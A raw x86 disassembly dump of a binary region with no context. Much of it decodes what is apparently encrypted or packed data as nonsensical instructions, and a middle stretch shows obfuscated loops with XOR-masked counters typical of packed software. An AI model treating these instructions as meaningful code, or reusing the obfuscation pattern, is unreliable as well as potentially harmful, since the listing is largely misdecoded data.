  4207b8:	ret    0xf880
  4207bb:	push   cs
  4207bc:	imul   DWORD PTR [ebx]
  4207be:	(bad)  
  4207bf:	lahf   
  4207c0:	stos   DWORD PTR es:[edi],eax
  4207c1:	dec    esp
  4207c2:	xor    eax,0xa1108850
  4207c7:	in     eax,dx
  4207c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207c9:	push   eax
  4207ca:	in     eax,dx
  4207cb:	retf   
  4207cc:	jae    0x420774
  4207ce:	inc    ecx
  4207cf:	(bad)  
  4207d1:	arpl   WORD PTR [ebx],si
  4207d3:	xlat   BYTE PTR ds:[ebx]
  4207d4:	and    BYTE PTR [ebx+0x334b5fa],ah
  4207da:	lea    esi,[edx]
  4207dc:	je     0x42080b
  4207de:	bound  ebx,QWORD PTR [ecx+0x1c]
  4207e1:	sbb    ebp,ecx
  4207e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207e4:	in     eax,0x48
  4207e6:	jno    0x420789
  4207e8:	jmp    0xe8ed68de
  4207ed:	cmc    
  4207ee:	adc    al,0x50
  4207f0:	pushf  
  4207f1:	cli    
  4207f2:	pop    edi
  4207f3:	inc    eax
  4207f4:	pop    esi
  4207f5:	daa    
  4207f6:	hlt    
  4207f7:	dec    ecx
  4207f8:	sbb    esp,esi
  4207fa:	cmc    
  4207fb:	sub    eax,0xa2ae2e87
  420800:	or     esp,DWORD PTR [ecx]
  420802:	or     DWORD PTR [ecx],0x1
  420805:	and    al,0xac
  420807:	rol    DWORD PTR [edi+eiz*2],cl
  42080a:	inc    edi
  42080b:	(bad)  
  42080c:	mov    ?,WORD PTR [edx+0x23]
  42080f:	xor    BYTE PTR [esp+eiz*2-0x78],bl
  420813:	inc    ebp
  420814:	push   esp
  420815:	mov    WORD PTR [esi],?
  420817:	cmp    eax,0xd9c6f5c8
  42081c:	dec    ebp
  42081d:	cmc    
  42081e:	je     0x4207ac
  420820:	jle    0x42085c
  420822:	ficomp WORD PTR [ecx]
  420824:	lds    ecx,FWORD PTR [edx+0x72]
  420827:	in     al,dx
  420828:	pop    es
  420829:	loope  0x42081c
  42082b:	call   0xdd4042ad
  420830:	in     al,0x2e
  420832:	sbb    eax,0xa85c387d
  420837:	cmp    ch,ch
  420839:	pop    es
  42083a:	inc    ebx
  42083b:	xchg   edi,eax
  42083c:	gs pause 
  42083f:	fidiv  DWORD PTR [ecx+0x4843ef6b]
  420845:	mov    ecx,0xe1ce289a
  42084a:	mov    ds:0x96611caf,al
  42084f:	push   cs
  420850:	cwde   
  420851:	out    0x37,al
  420853:	sar    BYTE PTR [eax],1
  420855:	les    edi,FWORD PTR [edx-0x3a]
  420858:	mov    eax,ds:0x8c0c113d
  42085d:	pop    ss
  42085e:	fidivr DWORD PTR [ebx-0x1d]
  420861:	add    BYTE PTR [esi-0x7ba29670],dh
  420867:	cmp    al,0x2c
  420869:	loop   0x4208ce
  42086b:	popf   
  42086c:	mov    cl,0xdd
  42086e:	aad    0x3c
  420870:	in     eax,0x79
  420872:	fadd   DWORD PTR [ebp-0x65]
  420875:	fldcw  WORD PTR [edx]
  420877:	test   eax,0xa6190651
  42087c:	fwait
  42087d:	leave  
  42087e:	xlat   BYTE PTR ds:[ebx]
  42087f:	or     esp,edx
  420881:	pop    esp
  420882:	adc    eax,0xef567931
  420887:	aad    0x74
  420889:	in     al,dx
  42088a:	fsub   QWORD PTR [ebx]
  42088c:	in     eax,dx
  42088d:	push   cs
  42088e:	mov    bl,0x1e
  420890:	fld    TBYTE PTR fs:[edi-0x46]
  420894:	(bad)
  420897:	je     0x420918
  420899:	out    0xd3,eax
  42089b:	repz cbw 
  42089e:	dec    edx
  42089f:	lods   eax,DWORD PTR ds:[esi]
  4208a0:	xor    edi,edx
  4208a2:	sbb    edx,eax
  4208a4:	jmp    0x7d0ab8f9
  4208a9:	mov    ah,0x23
  4208ab:	test   DWORD PTR [esi+0x58],edi
  4208ae:	call   0xbfdd:0xfa8bb087
  4208b5:	mov    dl,0xc8
  4208b7:	adc    al,0x99
  4208b9:	or     DWORD PTR [ebx+0x41f208ce],esp
  4208bf:	loopne 0x4208bd
  4208c1:	and    ah,BYTE PTR [eax]
  4208c3:	js     0x420933
  4208c5:	jle    0x420880
  4208c7:	mov    ch,0x9e
  4208c9:	dec    esi
  4208ca:	xchg   eax,esp
  4208cc:	mov    esi,0xc4c13f97
  4208d1:	test   eax,0x6015412c
  4208d6:	ror    dl,1
  4208d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208d9:	push   0x6e
  4208db:	fistp  QWORD PTR ds:0x221b7b41
  4208e1:	cmp    al,0x1a
  4208e3:	div    BYTE PTR [ecx+0x40]
  4208e6:	inc    esp
  4208e7:	cmp    BYTE PTR [ecx-0x8816ab7],cl
  4208ed:	push   ss
  4208ee:	xchg   edx,eax
  4208ef:	xor    eax,0x46b1a1eb
  4208f4:	adc    al,0xc4
  4208f6:	mov    dl,0xa1
  4208f8:	xchg   BYTE PTR [esi-0xf],dl
  4208fb:	cmp    dh,al
  4208fd:	in     al,dx
  4208fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208ff:	jmp    0x4208d4
  420901:	pop    esi
  420902:	icebp  
  420903:	popa   
  420904:	jg     0x420921
  420906:	adc    ebx,ebp
  420908:	mov    DWORD PTR [ebp+0x4d],edx
  42090b:	out    dx,al
  42090c:	jg     0x42094a
  42090e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42090f:	xor    al,0x1c
  420911:	aaa    
  420912:	(bad)  
  420913:	mov    edi,0x89c7d578
  420918:	xchg   ebx,eax
  420919:	mov    ds:0xd3c0a5f1,eax
  42091e:	or     BYTE PTR [ebp+0x19],bh
  420921:	inc    edx
  420922:	inc    esp
  420923:	sahf   
  420924:	test   dl,ch
  420926:	shl    BYTE PTR [ebp-0x99f2f98],0xfb
  42092d:	das    
  42092e:	dec    ecx
  42092f:	loopne 0x42092a
  420931:	and    al,0xc1
  420933:	jns    0x4209a3
  420935:	push   es
  420936:	lods   al,BYTE PTR ds:[esi]
  420937:	mov    esi,0x4a5c4da
  42093c:	push   eax
  42093d:	add    eax,0xd44fc970
  420942:	cld    
  420943:	aaa    
  420944:	adc    edx,edx
  420946:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420947:	mov    ebp,?
  420949:	mov    ds:0x58fa4d0,eax
  42094e:	pop    ecx
  42094f:	fcomp  DWORD PTR [edi-0x27]
  420952:	lods   al,BYTE PTR ds:[esi]
  420953:	shl    esp,cl
  420955:	je     0x420920
  420957:	(bad)  
  420959:	jmp    0x15978938
  42095e:	mov    al,0x5f
  420960:	movups xmm2,XMMWORD PTR [edi+0x28]
  420964:	mov    bh,0x7c
  420966:	xchg   edx,eax
  420967:	bound  ecx,QWORD PTR [edi]
  420969:	pop    es
  42096a:	nop
  42096b:	push   0x78
  42096d:	add    ah,BYTE PTR [edx-0x7b244e57]
  420973:	fpatan 
  420975:	mov    ecx,0xafaeef24
  42097a:	cs push edi
  42097c:	daa    
  42097d:	mov    BYTE PTR [esi+0x595113a1],0xb7
  420984:	adc    DWORD PTR [esi-0x3c0df2c3],ebx
  42098a:	mov    ds:0x42ef7fb5,eax
  42098f:	sbb    eax,0x7c472a75
  420994:	mov    dl,0xbd
  420996:	je     0x42096d
  420998:	aaa    
  420999:	mov    ebp,0xa24d5289
  42099e:	mov    eax,ds:0xd9d2c452
  4209a3:	adc    DWORD PTR [ebx+eiz*8],esp
  4209a6:	push   es
  4209a7:	outs   dx,DWORD PTR ds:[esi]
  4209a8:	xor    eax,0x6e05ecc6
  4209ad:	mov    eax,0xe24b873a
  4209b2:	mov    al,ds:0x3ec76e0e
  4209b7:	cmp    ecx,DWORD PTR [esi]
  4209b9:	cmp    BYTE PTR [esi],dl
  4209bb:	push   esi
  4209bc:	add    ah,BYTE PTR [esi+0x19]
  4209bf:	push   ds
  4209c0:	dec    edi
  4209c1:	or     esi,DWORD PTR [ecx-0x1c]
  4209c4:	in     eax,dx
  4209c5:	jge    0x420951
  4209c7:	rol    DWORD PTR [edi-0x6e7f2d79],0xd3
  4209ce:	jl     0x420a00
  4209d0:	jns    0x420969
  4209d2:	mov    ds:0x7b6db0de,eax
  4209d7:	mul    DWORD PTR [edx-0x14]
  4209da:	cs nop
  4209dc:	cmp    ah,BYTE PTR ds:0xe953d4d8
  4209e2:	(bad)  
  4209e4:	xchg   ecx,eax
  4209e5:	stc    
  4209e6:	xor    bl,bh
  4209e8:	and    edi,0xffffffc0
  4209eb:	jae    0x420a0c
  4209ed:	jae    0x420990
  4209ef:	push   eax
  4209f0:	lahf   
  4209f1:	mov    bh,0xf6
  4209f3:	fistp  QWORD PTR [di]
  4209f6:	call   0x88cc:0xa596fb8a
  4209fd:	jnp    0x420a1e
  4209ff:	jns    0x420983
  420a01:	mov    ds:0x9b6227b5,eax
  420a06:	mov    ebp,0xffa31a62
  420a0b:	(bad)  
  420a0c:	mov    ebp,0xe2878487
  420a11:	test   al,al
  420a13:	imul   esi,DWORD PTR [ebx-0x15593df9],0x59
  420a1a:	cdq    
  420a1b:	pop    eax
  420a1c:	call   0xf9d4:0xafa3ce51
  420a23:	add    eax,0xc316312c
  420a28:	(bad)  
  420a29:	scas   al,BYTE PTR es:[edi]
  420a2a:	push   ss
  420a2b:	sbb    eax,0xbb6ef14
  420a30:	jmp    FWORD PTR [edi]
  420a32:	cmc    
  420a33:	in     eax,dx
  420a34:	rol    DWORD PTR [edx+0x3a],1
  420a37:	mov    esi,0xb5ba2bb
  420a3c:	out    dx,eax
  420a3d:	out    dx,al
  420a3e:	stos   BYTE PTR es:[edi],al
  420a3f:	mov    ecx,0x89eda66d
  420a44:	xchg   edi,eax
  420a45:	lahf   
  420a46:	or     esp,DWORD PTR [ebp+edx*2-0x6b]
  420a4a:	add    eax,DWORD PTR [ebx]
  420a4c:	add    DWORD PTR [ebp-0x710bc12],edi
  420a52:	add    al,0x35
  420a54:	add    eax,0x312744c1
  420a59:	push   ebx
  420a5a:	jp     0x4209f2
  420a5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a5d:	xor    al,0xf7
  420a5f:	(bad)  [edx]
  420a61:	ror    BYTE PTR [edi-0x4b02deee],cl
  420a67:	mov    edx,0x239d7853
  420a6c:	das    
  420a6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a6e:	xor    BYTE PTR [edx],ch
  420a70:	inc    esi
  420a71:	js     0x4209f7
  420a73:	hlt    
  420a74:	ror    BYTE PTR [ebp+ecx*8+0x7e0dd074],0xd1
  420a7c:	add    al,0x91
  420a7e:	and    eax,0xd7589710
  420a83:	stos   BYTE PTR es:[edi],al
  420a84:	in     al,dx
  420a85:	inc    esi
  420a86:	push   eax
  420a87:	pop    ss
  420a88:	retf   0xdfd3
  420a8b:	inc    edi
  420a8c:	lds    esp,FWORD PTR [edx+0x27]
  420a8f:	ltr    WORD PTR [edx+0x4be8663b]
  420a96:	mov    eax,ds:0xee862aa1
  420a9b:	sub    eax,0x962f56dd
  420aa0:	retf   0x56e3
  420aa3:	mov    eax,0x4c1aec08
  420aa8:	pop    eax
  420aa9:	jno    0x420b00
  420aab:	in     eax,0x96
  420aad:	mov    esp,0x30bef0fc
  420ab2:	mov    esi,0xbe17bf04
  420ab7:	addr16 rcr ah,0x35
  420abb:	add    DWORD PTR [ecx],ecx
  420abd:	(bad)  
  420abe:	jl     0x420a6e
  420ac0:	hlt    
  420ac1:	sub    eax,0xbe171be9
  420ac6:	jl     0x420a6e
  420ac8:	out    dx,eax
  420ac9:	mov    ecx,DWORD PTR [edx]
  420acb:	and    dh,BYTE PTR [eax+0x75]
  420ace:	leave  
  420acf:	jl     0x420b24
  420ad1:	add    esi,ebx
  420ad3:	iret   
  420ad4:	pop    edx
  420ad5:	(bad)  
  420ad6:	pop    esp
  420ad7:	cdq    
  420ad8:	gs inc ecx
  420ada:	aam    0x82
  420adc:	add    al,0xf9
  420ade:	mul    BYTE PTR [ebx+0xf]
  420ae1:	f2xm1  
  420ae3:	jge    0x420b62
  420ae5:	(bad)  
  420ae6:	xlat   BYTE PTR ds:[ebx]
  420ae7:	jl     0x420a83
  420ae9:	and    eax,0x3357a923
  420aee:	out    0x81,al
  420af0:	stos   BYTE PTR es:[edi],al
  420af1:	xchg   esi,eax
  420af2:	jmp    0xb61e:0x1e67b349
  420af9:	mov    eax,0xf0a1ce9f
  420afe:	cdq    
  420aff:	dec    edi
  420b00:	jmp    0x420aad
  420b02:	or     DWORD PTR [ecx-0x2d],ebx
  420b05:	pop    eax
  420b06:	stc    
  420b07:	push   ebp
  420b08:	rcl    ch,1
  420b0a:	jne    0x420ad0
  420b0c:	mov    edx,0xa0324861
  420b11:	mov    ecx,0x8e379720
  420b16:	das    
  420b17:	push   es
  420b18:	mov    esp,0xac1e2de6
  420b1d:	mov    bh,0xd9
  420b1f:	push   0x804140da
  420b24:	pop    esi
  420b25:	push   ss
  420b26:	in     eax,dx
  420b27:	jne    0x420aba
  420b29:	cli    
  420b2a:	pusha  
  420b2b:	jo     0x420b49
  420b2d:	jns    0x420af7
  420b2f:	and    ebx,edx
  420b31:	mov    bh,0xb3
  420b33:	cmp    DWORD PTR [ecx+0x7c],eax
  420b36:	pop    edx
  420b37:	inc    edi
  420b38:	mov    eax,0x833724a4
  420b3d:	(bad)  
  420b3e:	jnp    0x420ae6
  420b40:	ds pop edx
  420b42:	frstor [ebp-0x69]
  420b45:	out    dx,eax
  420b46:	push   ss
  420b47:	imul   ecx,DWORD PTR [edx],0xe15f8580
  420b4d:	lds    esp,FWORD PTR [eax-0x7d]
  420b50:	pushf  
  420b51:	and    bh,BYTE PTR [ecx+eiz*2-0x51]
  420b55:	sub    ebp,DWORD PTR [edx]
  420b57:	pusha  
  420b58:	rol    DWORD PTR [edx],0x5c
  420b5b:	lock sub ch,BYTE PTR [edx+eiz*1]
  420b5f:	jp     0x420bda
  420b61:	inc    ecx
  420b62:	stc    
  420b63:	test   al,0x82
  420b65:	or     al,0xdf
  420b67:	mov    esi,0x7da4d46d
  420b6c:	cld    
  420b6d:	cmove  esp,edx
  420b70:	inc    esi
  420b71:	cmp    eax,0xf801c0a2
  420b76:	and    eax,0x3759e1fd
  420b7b:	retf   0xb603
  420b7e:	(bad)  
  420b7f:	jmp    0x9427:0x8fb2f5b1
  420b86:	push   es
  420b87:	(bad)  
  420b88:	and    eax,0x38f8d0b9
  420b8d:	xchg   ecx,eax
  420b8e:	idiv   BYTE PTR [ecx]
  420b90:	fimul  DWORD PTR [edi]
  420b92:	popf   
  420b93:	jae    0x420bf0
  420b95:	mov    esp,esi
  420b97:	into   
  420b98:	xchg   edx,eax
  420b99:	(bad)  
  420b9a:	push   esi
  420b9b:	int    0x5d
  420b9d:	sub    ebp,DWORD PTR [ecx+0xd]
  420ba0:	mov    eax,ds:0x32cce0b
  420ba5:	or     DWORD PTR [eax+0x4f],ecx
  420ba8:	push   ebx
  420ba9:	ss jno 0x420c04
  420bac:	push   esi
  420bad:	jle    0x420b7f
  420baf:	clc    
  420bb0:	adc    DWORD PTR [edx+0x9],esp
  420bb3:	or     DWORD PTR [esi+0x6903dc6d],eax
  420bb9:	cdq    
  420bba:	pop    ebp
  420bbb:	icebp  
  420bbc:	rcl    DWORD PTR [edi+0x6694b965],1
  420bc2:	push   ss
  420bc3:	sub    edi,0xffffffc9
  420bc6:	jb     0x420bd9
  420bc8:	out    dx,eax
  420bc9:	xor    al,bl
  420bcb:	mov    gs,edi
  420bcd:	lahf   
  420bce:	stos   BYTE PTR es:[edi],al
  420bcf:	stc    
  420bd0:	int    0x60
  420bd2:	div    DWORD PTR [esi-0xf]
  420bd5:	scas   al,BYTE PTR es:[edi]
  420bd6:	or     ecx,DWORD PTR [edi]
  420bd8:	mov    esp,0x78488ae9
  420bdd:	(bad)  
  420bde:	lock popa 
  420be0:	lods   al,BYTE PTR ds:[esi]
  420be1:	test   BYTE PTR ds:0x60d7839a,dl
  420be7:	adc    al,bl
  420be9:	add    dl,bl
  420beb:	pop    di
  420bed:	es popf 
  420bef:	mov    ds:0xd0e7e5d8,eax
  420bf4:	push   cs
  420bf5:	xlat   BYTE PTR ds:[ebx]
  420bf6:	loop   0x420c56
  420bf8:	mov    ds:0x51ffa217,al
  420bfd:	stos   DWORD PTR es:[edi],eax
  420bfe:	pusha  
  420bff:	data16 scas al,BYTE PTR es:[edi]
  420c01:	pop    edx
  420c02:	aas    
  420c03:	scas   al,BYTE PTR es:[edi]
  420c04:	sahf   
  420c05:	test   ebx,ecx
  420c07:	cmp    BYTE PTR [esi+0x5930dbd3],cl
  420c0d:	out    0x4c,eax
  420c0f:	xchg   esp,eax
  420c10:	adc    BYTE PTR [ecx],0xfb
  420c13:	inc    edx
  420c14:	jmp    0x420c2c
  420c16:	pop    ss
  420c17:	daa    
  420c18:	icebp  
  420c19:	mov    WORD PTR [esi+0xc8feec4],cs
  420c1f:	retf   0x5e9a
  420c22:	stc    
  420c23:	push   esi
  420c24:	push   ecx
  420c25:	and    al,0xe2
  420c27:	push   es
  420c28:	sti    
  420c29:	pop    ebx
  420c2a:	mov    DWORD PTR [eax+edx*2],esp
  420c2d:	fdivr  DWORD PTR [ecx-0x550d90bf]
  420c33:	dec    edi
  420c34:	mov    al,0xad
  420c36:	xchg   DWORD PTR [esi+0x62],esi
  420c39:	and    DWORD PTR [edx*4+0x1f6fdba],edi
  420c40:	lock fxch st(6)
  420c43:	clc    
  420c44:	inc    esi
  420c45:	out    0xb7,eax
  420c47:	arpl   WORD PTR [ecx-0x46],di
  420c4a:	cmp    bl,dl
  420c4c:	mov    ds,WORD PTR [ecx]
  420c4e:	xchg   ecx,eax
  420c4f:	jle    0x420c68
  420c51:	lods   al,BYTE PTR ds:[esi]
  420c52:	inc    edi
  420c53:	dec    esi
  420c54:	push   ebp
  420c55:	in     al,0xac
  420c57:	mov    edi,0x73d03e7d
  420c5c:	xchg   edx,eax
  420c5d:	out    0xaa,al
  420c5f:	mov    eax,ds:0x3063bcd6
  420c64:	xchg   ebx,eax
  420c65:	ins    DWORD PTR es:[edi],dx
  420c66:	clc    
  420c67:	mov    esi,0x620021bc
  420c6c:	mov    edi,0xbf050a1c
  420c71:	leave  
  420c72:	popa   
  420c73:	sbb    al,0x8f
  420c75:	fcomi  st,st(3)
  420c77:	mov    ecx,0x92cb6897
  420c7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c7d:	and    BYTE PTR [edx-0x4f853bba],ah
  420c83:	xlat   BYTE PTR ds:[ebx]
  420c84:	leave  
  420c85:	xor    ebp,ecx
  420c87:	mov    esp,0x54176e36
  420c8c:	push   eax
  420c8d:	int3   
  420c8e:	fwait
  420c8f:	jne    0x420c56
  420c91:	fcom   DWORD PTR [ecx+ebx*8+0x67da6e18]
  420c98:	lock and bh,0x2c
  420c9c:	add    bh,BYTE PTR [esi]
  420c9e:	lea    edx,[edi+0x2566de9c]
  420ca4:	je     0x420c95
  420ca6:	outs   dx,BYTE PTR ds:[esi]
  420ca7:	fist   WORD PTR [edx+0xf9ea6f]
  420cad:	adc    eax,0x7a57b976
  420cb2:	(bad)  
  420cb3:	fwait
  420cb4:	dec    ebp
  420cb5:	retf   
  420cb6:	xor    BYTE PTR [edx-0x33c63c7c],dl
  420cbc:	cmp    DWORD PTR [ebp+0x6f],ebp
  420cbf:	pop    eax
  420cc0:	out    dx,al
  420cc1:	mov    BYTE PTR [ebp+0x49],al
  420cc4:	arpl   WORD PTR [esi-0x66f18ef1],bp
  420cca:	mov    WORD PTR [esi+0x69],fs
  420ccd:	pushf  
  420cce:	sahf   
  420ccf:	test   ebx,edi
  420cd1:	call   0xf707:0x8d538357
  420cd8:	data16 not BYTE PTR [esi-0x3afe0e06]
  420cdf:	cmp    eax,0x19427772
  420ce4:	retf   
  420ce5:	cdq    
  420ce6:	ret    
  420ce7:	jge    0x420cd8
  420ce9:	(bad)  
  420ceb:	imul   DWORD PTR [eax-0x45a08743]
  420cf1:	mov    bl,0xac
  420cf3:	lods   al,BYTE PTR ds:[esi]
  420cf4:	sub    al,0x6d
  420cf6:	inc    edx
  420cf7:	jmp    0x50f3:0x8272254c
  420cfe:	inc    esp
  420cff:	rol    ah,1
  420d01:	inc    ebp
  420d02:	fistp  WORD PTR ds:0xf2b6ace4
  420d08:	push   esi
  420d09:	jno    0x420d32
  420d0b:	sub    bh,dl
  420d0d:	push   0x10
  420d0f:	xor    ebx,DWORD PTR [edi]
  420d11:	inc    ebx
  420d12:	or     al,bl
  420d14:	(bad)  
  420d15:	push   0x33
  420d17:	sti    
  420d18:	mov    DWORD PTR [edx],edi
  420d1a:	mov    edx,DWORD PTR [ebp+0x8]
  420d1d:	xor    edx,eax
  420d1f:	inc    ecx
  420d20:	inc    DWORD PTR [ebp-0x18]
  420d23:	add    edx,esi
  420d25:	cmp    ecx,edx
  420d27:	jb     0x41e963
  420d2d:	jmp    0x420d77
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	mov    DWORD PTR [ebp+0x8],ecx
  420d38:	jmp    0x420d6a
  420d3d:	mov    ecx,DWORD PTR [ebp+0x8]
  420d40:	mov    edx,DWORD PTR [ebp-0x8]
  420d43:	xor    ecx,eax
  420d45:	xor    edx,eax
  420d47:	sub    ecx,edx
  420d49:	sub    ecx,esi
  420d4b:	xor    ecx,eax
  420d4d:	mov    DWORD PTR [ebp+0x8],ecx
  420d50:	mov    ecx,DWORD PTR [ebp+0x8]
  420d53:	mov    edx,DWORD PTR [ebp+0x8]
  420d56:	imul   edx,edx,0x5708f2
  420d5c:	xor    ecx,eax
  420d5e:	add    ecx,esi
  420d60:	lea    ecx,[ebp+ecx*4-0x64]
  420d64:	mov    edi,DWORD PTR [ecx]
  420d66:	add    edx,edi
  420d68:	mov    DWORD PTR [ecx],edx
  420d6a:	mov    ecx,DWORD PTR [ebp+0x8]
  420d6d:	xor    ecx,eax
  420d6f:	add    ecx,esi
  420d71:	jne    0x420d3d
  420d77:	mov    ecx,DWORD PTR [ebp-0xc]
  420d7a:	mov    DWORD PTR [ebp+0x8],ecx
  420d7d:	jmp    0x420daf
  420d82:	mov    ecx,DWORD PTR [ebp+0x8]
  420d85:	mov    edx,DWORD PTR [ebp-0x8]
  420d88:	xor    ecx,eax
  420d8a:	xor    edx,eax
  420d8c:	sub    ecx,edx
  420d8e:	sub    ecx,esi
  420d90:	xor    ecx,eax
  420d92:	mov    DWORD PTR [ebp+0x8],ecx
  420d95:	mov    ecx,DWORD PTR [ebp+0x8]
  420d98:	mov    edx,DWORD PTR [ebp+0x8]
  420d9b:	imul   edx,edx,0x5708f2
  420da1:	xor    ecx,eax
  420da3:	add    ecx,esi
  420da5:	lea    ecx,[ebp+ecx*4-0x64]
  420da9:	mov    edi,DWORD PTR [ecx]
  420dab:	add    edx,edi
  420dad:	mov    DWORD PTR [ecx],edx
  420daf:	mov    ecx,DWORD PTR [ebp+0x8]
  420db2:	xor    ecx,eax
  420db4:	add    ecx,esi
  420db6:	jne    0x420d82
  420dbc:	mov    ecx,DWORD PTR [ebp-0x8]
  420dbf:	mov    edx,DWORD PTR [ebp-0x20]
  420dc2:	xor    ecx,eax
  420dc4:	lea    ecx,[ecx+edx*1+0x3272dd]
  420dcb:	mov    DWORD PTR [ebp-0x20],ecx
  420dce:	inc    DWORD PTR [ebp+0xc]
  420dd1:	mov    ecx,DWORD PTR [ebp-0x1c]
  420dd4:	xor    ecx,eax
  420dd6:	add    ecx,esi
  420dd8:	jne    0x413678
  420dde:	jmp    0x420e67
  420de3:	mov    ecx,DWORD PTR [ebp-0xc]
  420de6:	mov    DWORD PTR [ebp+0x8],ecx
  420de9:	jmp    0x420e1b
  420dee:	mov    ecx,DWORD PTR [ebp+0x8]
  420df1:	mov    edx,DWORD PTR [ebp-0x8]
  420df4:	xor    ecx,eax
  420df6:	xor    edx,eax
  420df8:	sub    ecx,edx
  420dfa:	sub    ecx,esi
  420dfc:	xor    ecx,eax
  420dfe:	mov    DWORD PTR [ebp+0x8],ecx
  420e01:	mov    ecx,DWORD PTR [ebp+0x8]
  420e04:	mov    edx,DWORD PTR [ebp+0x8]
  420e07:	imul   edx,edx,0x5708f2
  420e0d:	xor    ecx,eax
  420e0f:	add    ecx,esi
  420e11:	lea    ecx,[ebp+ecx*4-0x64]
  420e15:	mov    edi,DWORD PTR [ecx]
  420e17:	add    edx,edi
  420e19:	mov    DWORD PTR [ecx],edx
  420e1b:	mov    ecx,DWORD PTR [ebp+0x8]
  420e1e:	xor    ecx,eax
  420e20:	add    ecx,esi
  420e22:	jne    0x420dee
  420e28:	jmp    0x420e73
  420e2d:	mov    ecx,DWORD PTR [ebp+0x8]
  420e30:	mov    edx,DWORD PTR [ebp-0x8]
  420e33:	xor    ecx,eax
  420e35:	xor    edx,eax
  420e37:	sub    ecx,edx
  420e39:	sub    ecx,esi
  420e3b:	xor    ecx,eax
  420e3d:	mov    DWORD PTR [ebp+0x8],ecx
  420e40:	mov    ecx,DWORD PTR [ebp+0x8]
  420e43:	mov    edx,DWORD PTR [ebp+0x8]
  420e46:	xor    ecx,eax
  420e48:	imul   edx,edx,0x5708f2
  420e4e:	add    ecx,esi
  420e50:	lea    ecx,[ebp+ecx*4-0x64]
  420e54:	mov    edi,DWORD PTR [ecx]
  420e56:	add    edx,edi
  420e58:	mov    DWORD PTR [ecx],edx
  420e5a:	mov    ecx,DWORD PTR [ebp+0x8]
  420e5d:	xor    ecx,eax
  420e5f:	add    ecx,esi
  420e61:	jne    0x420e2d
  420e67:	mov    ecx,DWORD PTR [ebp-0x8]
  420e6a:	xor    ecx,eax
  420e6c:	mov    eax,DWORD PTR [ebp+0x10]
  420e6f:	add    ecx,esi
  420e71:	mov    DWORD PTR [eax],ecx
  420e73:	pop    edi
  420e74:	pop    esi
  420e75:	pop    ebx
  420e76:	leave  
  420e77:	ret    0xc
  420e7a:	dec    ebp
  420e7b:	and    eax,0x55210010
  420e80:	adc    BYTE PTR [eax],al
  420e82:	call   DWORD PTR [ebp+0x10]
  420e85:	add    bh,al
  420e87:	adc    BYTE PTR ss:[eax],al
  420e8a:	cld    
  420e8b:	ins    BYTE PTR es:[edi],dx
  420e8c:	adc    BYTE PTR [eax],al
  420e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e8f:	js     0x420ea1
  420e91:	add    BYTE PTR [ebx+eiz*2],al
  420e94:	adc    BYTE PTR [eax],al
  420e96:	dec    edi
  420e97:	jae    0x420ea9
  420e99:	add    ah,bl
  420e9b:	sub    eax,0x6ed60010
  420ea0:	adc    BYTE PTR [eax],al
  420ea2:	cmp    BYTE PTR [ecx],al
  420ea4:	adc    BYTE PTR [eax],al
  420ea6:	cwde   
  420ea7:	cmovb  eax,DWORD PTR [eax]
  420eaa:	pushf  
  420eab:	cmovb  eax,DWORD PTR [eax]
  420eae:	mov    al,ds:0xa400420f
  420eb3:	cmovb  eax,DWORD PTR [eax]
  420eb6:	test   al,0xf
  420eb8:	inc    edx
  420eb9:	add    BYTE PTR [edi+ecx*1+0xfb00042],ch
  420ec0:	inc    edx
  420ec1:	add    BYTE PTR [edi+ecx*1+0x42],dh
	...
  420ed4:	dec    edx
  420ed5:	aam    0xb3
  420ed7:	dec    ebp
  420ed8:	add    BYTE PTR [eax],al
  420eda:	add    BYTE PTR [eax],al
  420edc:	add    al,BYTE PTR [eax]
  420ede:	add    BYTE PTR [eax],al
  420ee0:	cmp    eax,0xc0000000
  420ee5:	lar    eax,WORD PTR [eax]
  420ee8:	rol    BYTE PTR [ebx],0x2
  420eeb:	add    BYTE PTR [edx+0xe],al
  420eee:	adc    BYTE PTR [eax],al
  420ef0:	pop    esp
  420ef1:	sbb    edx,DWORD PTR [eax]
  420ef3:	add    BYTE PTR [ebx-0x4dffefb0],cl
  420ef9:	sub    eax,0x29930010
  420efe:	adc    BYTE PTR [eax],al
  420f00:	mov    al,ds:0x5900101f
  420f05:	push   ebp
  420f06:	adc    BYTE PTR [eax],al
  420f08:	ret    0x102d
  420f0b:	add    BYTE PTR [edx+0xe],bh
  420f0e:	inc    edx
  420f0f:	add    BYTE PTR [esi+0xe],bh
  420f12:	inc    edx
  420f13:	add    BYTE PTR [edx-0x79ffbdf2],al
  420f19:	push   cs
  420f1a:	inc    edx
  420f1b:	add    BYTE PTR [edx-0x71ffbdf2],cl
  420f21:	push   cs
  420f22:	inc    edx
  420f23:	add    BYTE PTR [edx-0x69ffbdf2],dl
  420f29:	push   cs
  420f2a:	inc    edx
  420f2b:	add    BYTE PTR [edx-0x61ffbdf2],bl
  420f31:	push   cs
  420f32:	inc    edx
  420f33:	add    BYTE PTR [edx+0x5800420e],ah
  420f39:	cmovb  eax,DWORD PTR [eax]
  420f3c:	pop    esp
  420f3d:	cmovb  eax,DWORD PTR [eax]
  420f40:	pusha  
  420f41:	cmovb  eax,DWORD PTR [eax]
  420f44:	cmovb  eax,DWORD PTR fs:[eax]
  420f48:	push   0x6c00420f
  420f4d:	cmovb  eax,DWORD PTR [eax]
  420f50:	jo     0x420f61
  420f52:	inc    edx
  420f53:	add    BYTE PTR [edi+ecx*1+0x42],dh
  420f57:	add    al,cl
  420f59:	cmp    edx,DWORD PTR [eax]
  420f5b:	add    BYTE PTR [ecx+0x25],dh
  420f5e:	adc    BYTE PTR [eax],al
  420f60:	fld    TBYTE PTR [ecx]
  420f62:	adc    BYTE PTR [eax],al
  420f64:	xchg   edi,eax
  420f65:	sub    al,0x10
  420f67:	add    dh,ah
  420f69:	aaa    
  420f6a:	adc    BYTE PTR [eax],al
  420f6c:	and    eax,0xd5001051
